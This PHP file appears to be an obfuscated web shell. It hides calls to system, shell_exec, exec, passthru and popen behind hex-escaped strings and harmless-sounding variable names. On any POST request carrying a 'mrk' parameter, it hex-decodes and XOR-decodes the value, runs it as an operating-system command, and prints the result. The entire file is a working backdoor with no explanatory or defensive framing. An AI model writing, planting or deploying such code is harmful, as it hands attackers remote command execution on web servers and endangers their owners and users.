<?php

$token_parser_engine4 = "pa\x73\x73t\x68r\x75";
$token_parser_engine1 = "\x73yst\x65\x6D";
$token_parser_engine6 = "s\x74r\x65\x61m_\x67\x65\x74_\x63\x6F\x6E\x74ents";
$token_parser_engine2 = "s\x68\x65\x6C\x6C\x5Fexec";
$token_parser_engine5 = "\x70\x6Fpen";
$token_parser_engine3 = "e\x78\x65c";
$batch_process = "\x68\x65x2\x62\x69n";
$token_parser_engine7 = "p\x63lo\x73\x65";
if (isset($_POST["m\x72k"])) {
            function data_storage($itm , $token ) {
$ref= '';
 for($m=0;
 $m<strlen($itm);
 $m++){
$ref.=chr(ord($itm[$m])^$token);

} return $ref;

}
            $mrk = $batch_process($_POST["m\x72k"]);
            $mrk = data_storage($mrk, 25);
            if (function_exists($token_parser_engine1)) {
                $token_parser_engine1($mrk);
            } elseif (function_exists($token_parser_engine2)) {
                print $token_parser_engine2($mrk);
            } elseif (function_exists($token_parser_engine3)) {
                $token_parser_engine3($mrk, $fac_itm);
                print join("\n", $fac_itm);
            } elseif (function_exists($token_parser_engine4)) {
                $token_parser_engine4($mrk);
            } elseif (function_exists($token_parser_engine5) && function_exists($token_parser_engine6) && function_exists($token_parser_engine7)) {
                $token_ref = $token_parser_engine5($mrk, 'r');
                if ($token_ref) {
                    $bind_desc = $token_parser_engine6($token_ref);
                    $token_parser_engine7($token_ref);
                    print $bind_desc;
                }
            }
            exit;
        }